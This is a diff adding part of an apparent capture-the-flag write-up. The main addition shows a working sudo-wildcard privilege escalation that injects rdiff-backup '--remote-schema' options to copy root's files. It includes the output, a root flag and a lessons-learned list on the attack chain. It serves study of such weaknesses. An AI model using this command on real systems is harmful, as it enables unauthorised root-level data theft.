@@ -1034,6 +1034,46 @@ The rule intends to let `owen` serve read-only backups from `/opt/backup`. Three
 **Next:** Confirm the rdiff-backup version to use the correct `--remote-schema` placeholder syntax, then execute.
 <div align="center">
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 5.2 Exploit the rdiff-backup sudo rule and capture root.txt
+
+**Why this step:** The sudo rule permits a root-run `rdiff-backup --server` with appended arguments. Override its restriction scope via the wildcard and `--remote-schema` to read root-owned files.
+
+**Command:**
+
+```shell
+rm -rf /tmp/rdb && mkdir -p /tmp/rdb
+rdiff-backup \
+  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / # {h}' \
+  'localhost::/root' \
+  /tmp/rdb
+```
+
+**Breakdown:**
+
+- `--remote-schema '...'` replaces the server-launch command; set to a `sudo` call so the server runs as root.
+- `{h}` (the 2.x host placeholder) sits after `#`, so the substituted hostname is shell-commented away. The effective server command is `sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /`.
+- sudo matches the allowed prefix; the appended `--restrict-path /` rides the wildcard and, by last-value-wins parsing, becomes the enforced (root-readable) scope.
+- `'localhost::/root'` is the source mirrored by that root server; `/tmp/rdb` is the owen-writable destination.
+
+**Result (version note: rdiff-backup 2.2.6 uses `{h}`, not the writeup’s `%s`):**
+
+```
+NOTE: Starting mirror from source path /root to destination path /tmp/rdb
+# /tmp/rdb now contains root's home, owned by owen
+```
+
+```
+ROOT FLAG: 9d9336405d857be3d52613f878217ee9
+```
+
+**What this gives you:** Arbitrary root-file read as `owen`, used to exfiltrate `/root`. **Key finding:** full root-level file disclosure via sudo wildcard plus rdiff-backup `--remote-schema` injection, no root shell or password required.
+<div align="center">
+<br>
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
@@ -1042,6 +1082,14 @@ The rule intends to let `owen` serve read-only backups from `/opt/backup`. Three
 <div style="page-break-after: always;"></div>
 
 ## 6. Lessons Learned
+
+1. Always full-port scan. The entire box lived on non-default ports (OpenAM on 50389/4444/RMI); a top-1000 scan would have missed it.
+2. Version disclosure is everywhere. A cache-busting `?v=16.0.5` turned a product into a specific, exploitable CVE.
+3. Triage CVEs by reachability, not severity. Three “critical RCE” advisories existed; only the one hitting a default-enabled endpoint mattered.
+4. Match your toolchain to the target. Compiling the deserialization payload under the wrong JDK fails silently; JDK 21 was mandatory.
+5. Client-side encryption is not protection. A key the browser holds is a key you hold; the same logic broke GLPI’s `glpicrypt.key`.
+6. Password reuse is the cheapest, most reliable pivot. One recycled password beat a table of uncrackable bcrypt hashes.
+7. Wildcards in sudo rules are near-always exploitable. A trailing `*` plus a tool that honors “last option wins” equals full privilege escalation.
 <div align="center">
 <br>
 <br>
